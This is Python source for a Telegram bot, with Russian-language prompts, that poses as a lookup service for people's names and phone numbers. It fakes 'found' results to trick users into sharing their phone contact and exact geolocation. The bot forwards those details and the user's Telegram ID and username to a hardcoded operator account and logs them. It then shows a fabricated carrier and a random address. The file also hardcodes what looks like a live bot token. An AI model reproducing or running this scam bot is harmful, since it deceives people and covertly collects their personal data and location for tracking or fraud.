import telebot
from telebot import types
import time
import random

ID = '5058141288'
bot = telebot.TeleBot("5201724952:AAHCJ_KeV0PYtJC6lz88_nx4LpCB-Kislnk")
adr = ['Тверская улица, дом 13', 'Проспект 60-летия Октября', 'Улица Винокурова', '3-й Голутвинский переулок']
bot.send_message(ID, '!BOT STARTED!')

@bot.message_handler(commands=['start'])
def start(message):
	msg = bot.send_message(message.chat.id, '🤔 Вы можете прислать боту запросы в следующем формате:\n\n├ Иванов Сергей Юрьевич\n\n├ Иванов\n\n├ +79115222807')
	bot.register_next_step_handler(msg, proc2)

@bot.message_handler(commands=['log'])
def start(message):
	try:
	       with open('bot-log.txt') as f:
	       	data = f.readlines()
	       	bot.send_message(message.chat.id, data)
	except IOError:
	    bot.send_message(message.chat.id, 'No such file')
	    #bot.send_document(message.chat.id,f)


log = open('bot-log.txt', 'a+', encoding='utf-8')
def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			bot.send_message(m_id, f'Запрос по имени {num} отправлен!')
			time.sleep(2)
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
			button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True)
			keyboard.add(button_phone)
			bot.send_message(m_id, f'Информация по имени {num} найдена! Для продолжения зарегистрируйтесь!', reply_markup=keyboard)

		bot.send_message(m_id, f'Запрос на номер {num} отправлен!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True)
		keyboard.add(button_phone)
		bot.send_message(m_id, f'Информация по номеру {num} найдена! Для продолжения зарегистрируйтесь!', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact'])
def contact(message):
	if message.contact is not None:
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Данные
			├Имя: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Номер телефона: {phone}
			'''
		a = str(userid)
		log = open(a + '.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Провести проверку", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Информация о номере
		├Оператор: Beeline
		└Страна: Россия
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
		button_location = types.KeyboardButton(text="Подтвердить", request_location=True)
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='Для использования бесплатного расширенного поиска, подтвердите геолокацию!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location'])
def contact(message):
	if message.location is not None:
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat}
		└Карты: https://www.google.com/maps/place/{lat}+{lon}
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo)
		print(geo)
		bot.send_message(message.chat.id, f'''
			Геолокация
			└ Страна: Россия
			└Адрес: {random.choice(adr)}
			''')
bot.polling()
